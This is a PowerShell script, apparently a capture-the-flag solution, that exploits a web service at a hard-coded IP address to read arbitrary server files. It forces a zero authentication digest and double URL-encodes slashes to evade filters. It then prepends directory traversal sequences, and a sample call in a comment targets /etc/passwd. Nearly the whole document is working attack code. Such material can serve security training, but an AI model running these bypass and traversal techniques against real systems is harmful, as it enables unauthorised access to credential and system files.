```
function frostbit_filegrabber {
    param(
        [Parameter()]
        [string]$uuid,
		
		[Parameter()]
        [string]$nonce,
        
        [Parameter()]
        [string]$path
    )

    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $session.UserAgent = "MrsThePointALot"

	# we exploit the weak digest by setting it to zero
	$digest = '00000000000000000000000000000000'

	# double URL-encode nonce value e.g. 9091 becomes %2590%2591
	$encoded_nonce = ''
	for ($i=0; $i -lt $nonce.Length; $i+=2) {
		$encoded_nonce += "%25$($nonce.Substring($i,2))"
	}
	
	# XOR the nonce with itself, resulting in a zero digest
	$zerodigest = $encoded_nonce * 2
	
	# / is blocked, %2F is also blocked, so double URL-encode it
	# double URL-encode means we encode the % character using %25
	$path = $path.Replace('/','%252F')
	
	# Prepend the path traversal and zerodigest
	$path = "$zerodigest%252F..%252F..%252F..%252F..%252F..$path"
	
	Write-Host -NoNewLine "Attempting to retrieve file ."
	
	for ($i=0; $i -le 32; $i++) {
		try {
			$prefix = "a" * $i
			$response = Invoke-WebRequest "https://34.173.241.47/view/$prefix$path/$uuid/status?digest=$digest&debug=1"
		   
			# Extract base64 between markers
			if ($response.Content -match 'const debugData = "([^"]+)";') {
				$base64 = $matches[1]
				Write-Host "`nBase64:`n"
				Write-Host $base64
				Write-Host "`nDecoded:`n"
				$decoded = [System.Convert]::FromBase64String($base64)
				$utf_decoded = [System.Text.Encoding]::UTF8.GetString($decoded)
				Write-Host $utf_decoded
				
				# exit the loop if we succeeded
				return
			}
		} catch {
			Write-Host -NoNewLine "."
		}
	}
}

# frostbit_filegrabber -uuid 'c013b20d-c25c-4f58-97b5-2d114f8476fb' -nonce '2492e50835868e79' -path '/etc/passwd'

```